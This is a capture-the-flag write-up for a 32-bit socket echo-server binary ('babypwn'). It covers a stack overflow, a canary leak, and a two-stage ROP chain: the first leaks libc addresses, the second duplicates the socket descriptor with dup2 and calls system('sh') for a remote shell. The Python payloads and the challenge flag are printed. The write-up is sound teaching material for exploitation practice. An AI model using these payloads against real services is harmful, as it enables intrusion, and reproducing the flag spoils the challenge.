## Analyzing

32 bits ELF, Partial RELRO, with canary & NX, no PIE.

There is an obvious stack overflow vulnerablility, but this program uses `socket`, actually I haven't learned about socket programing so I won't talk too much about it, since all we need to do due to `fork` is dealing with file descriptor. 

Main operation is in `0x08048A71` function, and previous operation was setup of socket or sth. If you want to test this program locally:

* First run command `ncat -vc ./babypwn -kl 127.0.0.1 4000`
* Second, after looking into the src, we need to `nc localhost 4000` first then our socket program will be started up. After that, we can test our program by port 8181(`nc localhost 8181`).


The behavior of this program is simple:

```
===============================
1. Echo
2. Reverse Echo
3. Exit
===============================
Select menu > 1
Input Your Message : AAAA
AAAA

===============================
1. Echo
2. Reverse Echo
3. Exit
===============================
Select menu >
```

Just an echo server, at first glance, I thought there was a format string vulnerablility, but it wasn't. It is just an echo server. However, we can overflow the stack when it takes the input. And we will use this vulnerablility to leak canary to do later exploit.

## Exploit

**Overflow**

I use ida pro.

```c
char buf[40]; // [sp+24h] [bp-34h]@1
...
socket_recv(buf, 100) // socket_recv == 0x08048907
```

Here is an obvious overflow. Therefore, we can calculate offset for canary then make buffer on stack look like this:

```
0xff951f54:     0x41414141      0x41414141      0x41414141      0x41414141
0xff951f64:     0x41414141      0x41414141      0x41414141      0x41414141
0xff951f74:     0x41414141      0x41414141      0x4409b50a      0x00000000
```

`0x4409b50a` is our canary, since the first byte of canary would be '\x00', I use the newline to overwrite it so that we can leak the last 3 bytes. After we get the `0x4409b50a`, we just need to change newline back to null byte then we get the canary of this binary. So the real canary is `0x4409b500`.

With canary, we can bypass the stack guard. I will use it to do the first ROP. In the first ROP, I will leak the file descriptor for the socket and the libc function address in order to get the version of libc by using [libc database](http://libcdb.com).

First ROP payload:

```python
socket_send = 0x080488B1
pop1 = 0x08048589
sigemptyset_got = 0x0804B048
echo_select = 0x08048A71
fd_address = 0x0804B1B8
rop1 = [socket_send, pop1, sigemptyset_got, 
        socket_send, echo_select, fd_address]
payload = 'A'*40 +      # padding to canary
        p32(canary) +
        'A'*12 +        # padding to return address
        ''.join(map(p32, rop1))
```

After placing the ROP gadgets, we need to choose choice 3 to return, then it will return to our ROP gadgets.

I use the [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to find the gadget `pop1` which pop once then ret. Since we need to do the second ROP(duplicate file descriptor and open the shell) after leaking information, I make the end of the first ROP return to the `0x08048A71`(function of main operation).


After finding out the version of libc, we can get the libc base. In the second ROP, I will use `dup2` to copy the fd of socket to stdin and stdout then open the shell.(Use dup2 so that we can get the interactive shell)

```python
pop2 = 0x08048B84
sh = base + next(libc.search('sh\x00'))
rop2 = [dup2, pop2, fd, 1,
        dup2, pop2, fd, 0,
        system, 0xdeadbeef, sh]
payload = 'A'*40 +      # padding to canary
        p32(canary) +
        'A'*12 +        # padding to return address
        ''.join(map(p32, rop2))
```

Again, choose the choice 3 to return then open the shell!

FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}
